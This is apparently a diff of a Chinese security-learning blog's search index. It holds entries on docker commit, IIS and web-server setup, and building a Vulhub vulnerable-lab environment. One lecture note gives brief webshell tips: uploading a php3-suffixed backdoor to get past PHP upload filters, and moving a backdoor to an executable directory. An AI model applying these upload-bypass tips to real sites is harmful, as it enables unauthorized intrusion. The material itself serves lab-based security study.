-<h1 id="十、搭建Vulhub靶场"><a href="#十、搭建Vulhub靶场" class="headerlink" title="十、搭建Vulhub靶场"></a>十、搭建Vulhub靶场</h1><h2 id="1、下载"><a href="#1、下载" class="headerlink" title="1、下载"></a>1、下载</h2><p>&emsp;&emsp;Vulhub官网：<a href="https://vulhub.org/vulhub">https://vulhub.org/vulhub</a></p>
-<h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><ol>
-<li>官方推荐用Ubuntu来安装</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631416690983-99b4b6ce-8c30-4546-9c4c-5b7b6d532e92.png" alt="img"></p>
-<ol start="2">
-<li>安装常用软件：</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt是Ubuntu的一个更新源</span><br><span class="line">apt-get update:更新软件列表</span><br><span class="line">apt-get install:安装命令</span><br><span class="line">apt-get install ssh：安装ssh服务</span><br><span class="line">apt-get install vim：安装vim编辑器</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631416917773-f2e41770-c185-4a02-9c32-334cc2931fe8.png" alt="img"></p>
-<ol start="3">
-<li>开启ssh服务（查看状态已经开启过了）：<code>systemctl status ssh</code> 或者 <code>service ssh status</code></li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631417044185-6b4ebfb6-d075-490e-b296-ccceb7986551.png" alt="img"></p>
-<ol start="4">
-<li><p>安装curl：<code>sudo apt-get install curl</code></p>
-</li>
-<li><p>安装Docker：<code>curl -s https://get.docker.com/ | sh</code></p>
-</li>
-<li><p>查看docker是否安装成功：<code>docker -v</code></p>
-</li>
-<li><p>安装docker-compose（没有pip命令先安装Python：<code>apt-get install python3-pip</code>）<br>命令：<code>pip install docker-compose</code></p>
-</li>
-<li><p>检查是否安装成功：<code>docker-compose -v</code></p>
-</li>
-<li><p>下载Vulhub（不能执行Git命令的先安装Git，命令：<code>apt-get install git</code>）<br>命令：<code>git clone https://github.com/vulhub/vulhub.git</code></p>
-</li>
-<li><p>将下载好的vulhub移至local文件夹：<code>mv vulhub /usr/local</code></p>
-</li>
-<li><p>安装成功，进入目录</p>
-</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631418453888-3163fec5-a7c7-45a3-b65e-b6fd5258afb6.png" alt="img"></p>
-<h2 id="3、启动环境"><a href="#3、启动环境" class="headerlink" title="3、启动环境"></a>3、启动环境</h2><ol>
-<li>进入漏洞环境目录：<code>cd tomcat/tomcat8/</code></li>
-<li>执行命令：<br><code>docker-compose build</code><br><code>docker-compose up -d</code>   </li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419409253-31a4ba17-0535-4129-965b-80d6d6305104.png" alt="img"></p>
-<ol start="3">
-<li>安装完成</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419623872-a46e8312-7c26-4540-9ef1-9682c0c4487e.png" alt="img"></p>
-<ol start="4">
-<li>打开官网，根据官方文档来操作</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419543235-4953f1c4-ee63-4ef7-b5bf-d2ac5dd280d3.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419722240-d408ed6d-da4b-4c9c-88c4-047e82762c36.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419731555-8c7da4fa-9614-4156-a278-11e173c16498.png" alt="img"></p>
-<ol start="5">
-<li><p>复现之后即可关闭：<code>docker-compose down</code></p>
-</li>
-<li><p>完成</p>
-</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419756533-734560fb-03d0-4ec0-8607-99ca14a932c1.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -1606,6 +1430,204 @@
       </tags>
   </entry>
   <entry>
+    <title>docker commit镜像</title>
+    <url>/post/1c96de95.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
+<li>命令：<code>docker commit</code>   #提交容器成为一个新的副本</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">命令和git原理类似</span></span><br><span class="line">docker commit -a=&quot;作者&quot; -m=&quot;提交的描述信息&quot; 容器id 目标镜像名[:TAG]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>实战测试</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">启动一个默认的docker</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">发现这个默认的tomcat是没有webapps应用，镜像的原因，官方的镜像默认webapps下面是没有文件的</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">我自己从webapps.dist拷贝进webapps了基本文件</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">将我们操作过的容器通过commit提交为一个镜像！我们以后就使用我们修改过的镜像即可</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630460544134-55c5eda4-78b6-4871-b1e4-7954128009ec.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web搭建安全拓展</title>
+    <url>/post/ec694927.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、常见搭建平台脚本启用"><a href="#一、常见搭建平台脚本启用" class="headerlink" title="一、常见搭建平台脚本启用"></a>一、常见搭建平台脚本启用</h1><p>&emsp;&emsp;ASP，PHP，ASPX，JSP，PY，JAVAWEB等环境</p>
+<h1 id="二、域名IP目录解析安全问题"><a href="#二、域名IP目录解析安全问题" class="headerlink" title="二、域名IP目录解析安全问题"></a>二、域名IP目录解析安全问题</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>&emsp;&emsp;IP地址访问可以发现更多的信息同时经常能找到程序源码备份文件和敏感信息，而域名访问只能发现一个文件夹下的所有文件。</p>
+<p>&emsp;&emsp;网站搭建的时候支持IP访问和域名访问，域名访问的时候一般只会指向某个目录，IP访问的时候指向的是根目录。</p>
+<h2 id="2、实验分析"><a href="#2、实验分析" class="headerlink" title="2、实验分析"></a>2、实验分析</h2><h3 id="（1）实验环境搭建"><a href="#（1）实验环境搭建" class="headerlink" title="（1）实验环境搭建"></a>（1）实验环境搭建</h3><p>&emsp;&emsp;在根目录下创建一个index.html</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630683782688-d8e3b583-1430-42ff-8a84-85cbf0533f92.png" alt="img"></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span>这是<span class="tag">&lt;<span class="name">strong</span>&gt;</span>根目录<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>下的网页<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;在根目录下创建一个名为wnd的文件夹，里面写一个index.html</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630683525952-24230f93-5dc0-48ad-a54e-cff4abf6ab88.png" alt="img"></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span>这是<span class="tag">&lt;<span class="name">strong</span>&gt;</span>wnd目录<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>下的网页<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;将域名wnd198.com绑定到wnd文件夹</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630683481862-19e93d5e-5b7a-49cb-89f8-32d1cd7f4dd6.png" alt="img"></p>
+<p>&emsp;&emsp;利用<code>ipconfig</code>查看到本机IP为192.168.1.104，修改hosts文件，增加一条解析</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630684193463-6f1f318e-9e51-4f50-9a69-b9811dea2b1b.png" alt="img"></p>
+<h3 id="（2）验证和结果分析"><a href="#（2）验证和结果分析" class="headerlink" title="（2）验证和结果分析"></a>（2）验证和结果分析</h3><p>&emsp;&emsp;访问<code>wnd198.com</code>，访问的是wnd目录下的文件</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630684388646-bbe73dc5-2341-413f-bae7-d1e2e5a307b8.png" alt="img"></p>
+<p>&emsp;&emsp;直接访问IP地址192.168.1.104，访问的是根目录的文件</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630684482393-bae0eaa8-64fb-4c40-8e26-10fe78823d56.png" alt="img"></p>
+<h1 id="三、部署IIS"><a href="#三、部署IIS" class="headerlink" title="三、部署IIS"></a>三、部署IIS</h1><h2 id="1、安装IIS"><a href="#1、安装IIS" class="headerlink" title="1、安装IIS"></a>1、安装IIS</h2><p>&emsp;&emsp;安装IIS之web插件，插入光盘–找到IIS–WEB(应用程序服务器–Internet信息服务）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630679597916-bca44dff-2edf-4e15-85d2-50c69fb60953.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630679631430-aca28da8-36e3-4977-b1d5-21f2c726a7c0.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630679713520-4accfcdc-5a23-4561-aed6-1b6a7c944948.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630679733051-dd7083f3-bdcb-4e1b-86d9-2df3e85b1562.png" alt="img"></p>
+<p>&emsp;&emsp;出现这种情况把D改成E即可。因为之前我安装虚拟机的时候强制把D盘符给了硬盘，把光盘设置为E盘，所以按安装程序还以为光盘在D盘所以找不到文件因此冒出提示</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630680409256-f0ef8643-9a02-4805-a983-d29edee922c0.png" alt="img"></p>
+<p>&emsp;&emsp;安装完成，可以在这里看到</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630680562162-ecc3e018-7a1a-4c91-bb78-ff2a28a48ce7.png" alt="img"></p>
+<h2 id="2、验证安装情况"><a href="#2、验证安装情况" class="headerlink" title="2、验证安装情况"></a>2、验证安装情况</h2><p>&emsp;&emsp;安装完毕，使用<code>netstat -an</code>验证TCP/80端口是否打开！此时80已经打开，且IIS自带了一个发布好的网站，称之为默认网站！</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630680752200-08b217d0-a15b-46c1-a225-c2878155eddf.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630680927345-417ab75f-3372-442d-b547-3980773fa395.png" alt="img"></p>
+<p>&emsp;&emsp;IIS自带的默认网站路径：<strong>c:\Inetpub\wwwroot</strong>。此时建议停止默认网站！</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630681004416-eb7df5b5-a0ab-448d-bfa3-10f16aa55688.png" alt="img"></p>
+<p>&emsp;&emsp;停止默认网站后，可以发现TCP 80端口号也不见了，因此可以知道80端口号开放了那么web服务器一定有一个以上的网站。用xp再次访问10.1.1.1，显示如下错误，这是因为最后一个网站都停用了，那TCP 80端口号就关闭了</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630681113705-e1ec0a24-7ac8-44a8-978a-47a52b1a41c1.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630681136908-a3c7c546-1429-4e0d-95e6-7e36ae6e4228.png" alt="img"></p>
+<h2 id="3、新建网站"><a href="#3、新建网站" class="headerlink" title="3、新建网站"></a>3、新建网站</h2><p>&emsp;&emsp;新建一个flower的网站，并在网站目录下新建一个index.html文件并将该html在文档一栏中设置为默认文档</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#index.html源码</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Welcome to my flowers store<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630686278069-2de13101-a8bd-4396-929c-57c7984d3124.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631077671743-9e074b2b-dcdd-456d-a7a4-6f91f80f0661.png" alt="img"></p>
+<p>&emsp;&emsp;访问成功</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631077781146-d82852c4-f925-479c-a83a-d894208c570c.png" alt="img"></p>
+<h1 id="四、常见文件后缀解析对应安全"><a href="#四、常见文件后缀解析对应安全" class="headerlink" title="四、常见文件后缀解析对应安全"></a>四、常见文件后缀解析对应安全</h1><p>&emsp;&emsp;指定后缀名对应某个文件，访问网站出现遇到不能解析的文件就是中间件可能默认或者添加某些设置导致解析时出现问题。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631077557389-1e024f1d-5de7-4c33-8b86-2749df38aeae.png" alt="img"></p>
+<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="（1）实验准备"><a href="#（1）实验准备" class="headerlink" title="（1）实验准备"></a>（1）实验准备</h3><p>&emsp;&emsp;从网站上随便找了个asp网站源码，先按照使用手册的要求进行相关设置</p>
+<p>&emsp;&emsp;对网站根目录下的Nzcms_nzweb文件夹添加everyone用户，写入权限</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079397353-91f7cc67-90d2-4138-8476-ad8d5397f590.png" alt="img"></p>
+<p>&emsp;&emsp;开通IIS父路径</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079579444-b6e9ccb0-59c7-4ee0-9704-a9c551b842c2.png" alt="img"></p>
+<p>&emsp;&emsp;IIS设置执行权限（纯脚本） </p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079660474-9ac58478-efe9-406e-a11e-946796eea766.png" alt="img"></p>
+<p>&emsp;&emsp;如果执行权限为无，那么当访问<code>http://本机IP/nz0808/index.asp</code>，发现错误，报错信息为无法运行脚本，说明没有运行的权限</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631078672193-6f546557-4605-444a-845d-394a4f14f71b.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631078575537-1bd33227-0626-4f5d-bd8e-4f703413efb8.png" alt="img"></p>
+<p>&emsp;&emsp;添加index.asp文档名称</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079751744-5066f25c-06dc-495a-ac9e-338d95f2bda6.png" alt="img"></p>
+<p>&emsp;&emsp;IIS里的WEB服务器扩展设置</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079814652-67f9475b-4a48-4451-a734-8b4ce985265b.png" alt="img"></p>
+<p>&emsp;&emsp;访问成功</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079973928-8f4489b2-ca0e-4103-a1cf-6ae69e253f8d.png" alt="img"></p>
+<h3 id="（2）进行实验"><a href="#（2）进行实验" class="headerlink" title="（2）进行实验"></a>（2）进行实验</h3><p>&emsp;&emsp;当我们访问：<code>http://192.168.43.77/index.asp</code>时，正常成功访问</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080101192-6920a682-320d-4309-aeaf-b9d7a77d58c9.png" alt="img"></p>
+<p>&emsp;&emsp;当我们访问：<code>http://192.168.43.77/index.haha123</code>时，找不到网页，正常，因为网站根本没有这个文件</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080131950-d7eb85a0-f4d9-4462-a118-7b32431aef25.png" alt="img"></p>
+<p>&emsp;&emsp;将index.asp重命名为index.haha123后，再次访问<code>http://192.168.43.77/index.haha123</code>，还是不行，因为无法解析后缀名为haha123的文件</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080911556-db7b4f14-9bc9-408d-a3f5-8b30b911d239.png" alt="img"></p>
+<p>&emsp;&emsp;添加一个haha123的文件后缀解析规则，将haha123后缀解析为asp</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080786865-53251af1-a424-47ed-a984-a8f1a499b471.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080384718-da3ffe3e-b1ad-4745-8034-11d538adc3b2.png" alt="img"></p>
+<p>&emsp;&emsp;再次访问：<code>http://192.168.43.77/index.haha123</code>时，成功解析打开</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080851217-21fffd33-cd39-4a08-b0ff-4c7deb2b2bb9.png" alt="img"></p>
+<h3 id="（3）实验总结"><a href="#（3）实验总结" class="headerlink" title="（3）实验总结"></a>（3）实验总结</h3><p>&emsp;&emsp;在实验准备的过程中，有一步是增加了Everyone用户并对其进行权限设置，在很多时候比如用菜刀连接一句话木马的时候，会发现只看的到当前网站目录访问不到别的目录；或者是只能看文件但是不能修改文件；这些都可能是设置了目录的用户权限</p>
+<p>&emsp;&emsp;在实验准备的过程中，有一步是设置执行权限为纯脚本，假如为无那么将运行不了脚本文件，因此有的时候即使上传了一句话木马但是发现连接不上很可能是因为执行权限不够。但是一般情况下，考虑到网站运行，都会允许脚本运行</p>
+<p>&emsp;&emsp;在实验时发现，只要解析规则上有，就可以解析相关的后缀文件。因此假如一句话木马不允许上传PHP文件，但是解析规则又能解析php3为php文件，那么可以上传php3后缀的木马文件进行绕过。</p>
+<h1 id="五、常见安全测试中的安全防护"><a href="#五、常见安全测试中的安全防护" class="headerlink" title="五、常见安全测试中的安全防护"></a>五、常见安全测试中的安全防护</h1><ol>
+<li>企业内网会限制外部人员访问内部的网站，限制IP地址，规范访问者的权限</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008822063-6c337fcc-d3cf-4ad4-bbd5-47df888eba58.png" alt="img"></p>
+<ol start="2">
+<li>身份验证和访问控制，基于用户的限制</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008830641-b5f6558a-e62a-41ca-ae1a-28f14dfdb62e.png" alt="img"></p>
+<ol start="3">
+<li>限制IP地址的访问，授权访问-只允许指定IP地址可以访问。 拒绝访问-指定IP地址拒绝访问</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008840558-1fe89da7-f7f2-49cd-9cd1-a36a2b0b749f.png" alt="img"></p>
+<h1 id="六、Web目录中敏感文件"><a href="#六、Web目录中敏感文件" class="headerlink" title="六、Web目录中敏感文件"></a>六、Web目录中敏感文件</h1><ol>
+<li><p>后台路径</p>
+</li>
+<li><p>配置文件</p>
+</li>
+<li><p>备份文件</p>
+</li>
+</ol>
+<h1 id="七、Web后门与用户及文件权限"><a href="#七、Web后门与用户及文件权限" class="headerlink" title="七、Web后门与用户及文件权限"></a>七、Web后门与用户及文件权限</h1><ol>
+<li>设置相关权限，禁止来宾用户的权限，导致连接的后门看不到任何东西，它属于防护技巧，同时也是测试里经常碰到的问题</li>
+<li>设置了执行权限，没有执行权限，文件不给执行，代码就无法正常执行，后门就无法正常使用</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008876621-456f9a3a-3ba5-49ee-956d-a97b05f984a9.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008902225-3d083773-6e85-4a80-9d10-3e6ab5bfcccf.png" alt="img"></p>
+<ol start="3">
+<li><p>绕过思路：</p>
+</li>
+<li><p>a. 将后门试着放在其他可以执行的目录。比如，网站根目录或者其他有脚本存放的目录下面</p>
+</li>
+</ol>
+<h1 id="八、基于中间件的简要识别"><a href="#八、基于中间件的简要识别" class="headerlink" title="八、基于中间件的简要识别"></a>八、基于中间件的简要识别</h1><p>&emsp;&emsp;通过抓取数据包的返回结果，查询搭建平台信息</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631081913201-6966ab37-b31a-4e0d-97d5-9ad792c56ec6.png" alt="img"></p>
+<h1 id="九、基于中间件的安全漏洞"><a href="#九、基于中间件的安全漏洞" class="headerlink" title="九、基于中间件的安全漏洞"></a>九、基于中间件的安全漏洞</h1><p>&emsp;&emsp;<a href="https://www.freebuf.com/articles/web/192063.html">https://www.freebuf.com/articles/web/192063.html</a></p>
+<p>&emsp;&emsp;<a href="https://www.yuque.com/attachments/yuque/0/2021/pdf/2893488/1631082172781-1c4b0d7e-b1bb-4599-b4d1-e4a86a7a97f1.pdf">web中间件常见漏洞总结.pdf</a></p>
+<h1 id="十、搭建Vulhub靶场"><a href="#十、搭建Vulhub靶场" class="headerlink" title="十、搭建Vulhub靶场"></a>十、搭建Vulhub靶场</h1><h2 id="1、下载"><a href="#1、下载" class="headerlink" title="1、下载"></a>1、下载</h2><p>&emsp;&emsp;Vulhub官网：<a href="https://vulhub.org/vulhub">https://vulhub.org/vulhub</a></p>
+<h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><ol>
+<li>官方推荐用Ubuntu来安装</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631416690983-99b4b6ce-8c30-4546-9c4c-5b7b6d532e92.png" alt="img"></p>
+<ol start="2">
+<li>安装常用软件：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt是Ubuntu的一个更新源</span><br><span class="line">apt-get update:更新软件列表</span><br><span class="line">apt-get install:安装命令</span><br><span class="line">apt-get install ssh：安装ssh服务</span><br><span class="line">apt-get install vim：安装vim编辑器</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631416917773-f2e41770-c185-4a02-9c32-334cc2931fe8.png" alt="img"></p>
+<ol start="3">
+<li>开启ssh服务（查看状态已经开启过了）：<code>systemctl status ssh</code> 或者 <code>service ssh status</code></li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631417044185-6b4ebfb6-d075-490e-b296-ccceb7986551.png" alt="img"></p>
+<ol start="4">
+<li><p>安装curl：<code>sudo apt-get install curl</code></p>
+</li>
+<li><p>安装Docker：<code>curl -s https://get.docker.com/ | sh</code></p>
+</li>
+<li><p>查看docker是否安装成功：<code>docker -v</code></p>
+</li>
+<li><p>安装docker-compose（没有pip命令先安装Python：<code>apt-get install python3-pip</code>）<br>命令：<code>pip install docker-compose</code></p>
+</li>
+<li><p>检查是否安装成功：<code>docker-compose -v</code></p>
+</li>
+<li><p>下载Vulhub（不能执行Git命令的先安装Git，命令：<code>apt-get install git</code>）<br>命令：<code>git clone https://github.com/vulhub/vulhub.git</code></p>
+</li>
+<li><p>将下载好的vulhub移至local文件夹：<code>mv vulhub /usr/local</code></p>
+</li>
+<li><p>安装成功，进入目录</p>
+</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631418453888-3163fec5-a7c7-45a3-b65e-b6fd5258afb6.png" alt="img"></p>
+<h2 id="3、启动环境"><a href="#3、启动环境" class="headerlink" title="3、启动环境"></a>3、启动环境</h2><ol>
+<li>进入漏洞环境目录：<code>cd tomcat/tomcat8/</code></li>
+<li>执行命令：<br><code>docker-compose build</code><br><code>docker-compose up -d</code>   </li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419409253-31a4ba17-0535-4129-965b-80d6d6305104.png" alt="img"></p>
+<ol start="3">
+<li>安装完成</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419623872-a46e8312-7c26-4540-9ef1-9682c0c4487e.png" alt="img"></p>
+<ol start="4">
+<li>打开官网，根据官方文档来操作</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419543235-4953f1c4-ee63-4ef7-b5bf-d2ac5dd280d3.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419722240-d408ed6d-da4b-4c9c-88c4-047e82762c36.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419731555-8c7da4fa-9614-4156-a278-11e173c16498.png" alt="img"></p>
+<ol start="5">
+<li><p>复现之后即可关闭：<code>docker-compose down</code></p>
+</li>
+<li><p>完成</p>
+</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419756533-734560fb-03d0-4ec0-8607-99ca14a932c1.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>dockerfile文件</title>
     <url>/post/fba1b6b.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、什么是DockerFile"><a href="#一、什么是DockerFile" class="headerlink" title="一、什么是DockerFile"></a>一、什么是DockerFile</h1><p>&emsp;&emsp;Dockerfile是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。Docker通过读取Dockerfile中的指令自动生成映像。</p>
@@ -1774,28 +1796,6 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos tomcat]# cd tomcatlogs</span><br><span class="line">[root@VM-0-15-centos tomcatlogs]# ls</span><br><span class="line">catalina.2021-09-04.log  catalina.out  localhost.2021-09-04.log  localhost_access_log.2021-09-04.txt</span><br><span class="line">[root@VM-0-15-centos tomcatlogs]# cat catalina.out</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630778803163-49f833a3-3c41-45da-8572-1cbaedab4492.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>docker commit镜像</title>
-    <url>/post/1c96de95.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
-<li>命令：<code>docker commit</code>   #提交容器成为一个新的副本</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">命令和git原理类似</span></span><br><span class="line">docker commit -a=&quot;作者&quot; -m=&quot;提交的描述信息&quot; 容器id 目标镜像名[:TAG]</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>实战测试</li>
-</ul>
